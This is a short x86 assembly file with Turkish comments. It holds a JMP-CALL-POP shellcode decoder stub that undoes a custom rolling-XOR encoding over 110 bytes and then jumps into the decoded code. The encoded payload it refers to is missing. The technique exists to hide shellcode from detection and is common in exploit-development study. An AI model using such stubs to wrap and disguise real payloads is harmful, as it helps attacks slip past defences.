global _start

section .text
_start:
        jmp short call_shc

decoder:
        pop esi

        xor eax, eax
        xor ebx, ebx
        mov bl, 0xAA

        ; İlk işlenecek indis = 7
        mov edi, 7

        ; Toplam 110 byte
        xor ecx, ecx
        mov cl, 110

decode_loop:

        ; encoded_shc[edi]
        mov al, byte [esi + edi]

        ; XOR ile çöz
        xor al, bl

        ; plaintext'i aynı indise yaz
        mov byte [esi + edi], al

        ; dinamik key = key + plaintext
        add bl, al

        ; sonraki indis
        inc edi

        ; 110'a ulaştıysak başa sar
        cmp edi, 110
        jne continue_loop

        xor edi, edi

continue_loop:
        loop decode_loop

        jmp short encoded_shc

call_shc:
        call decoder

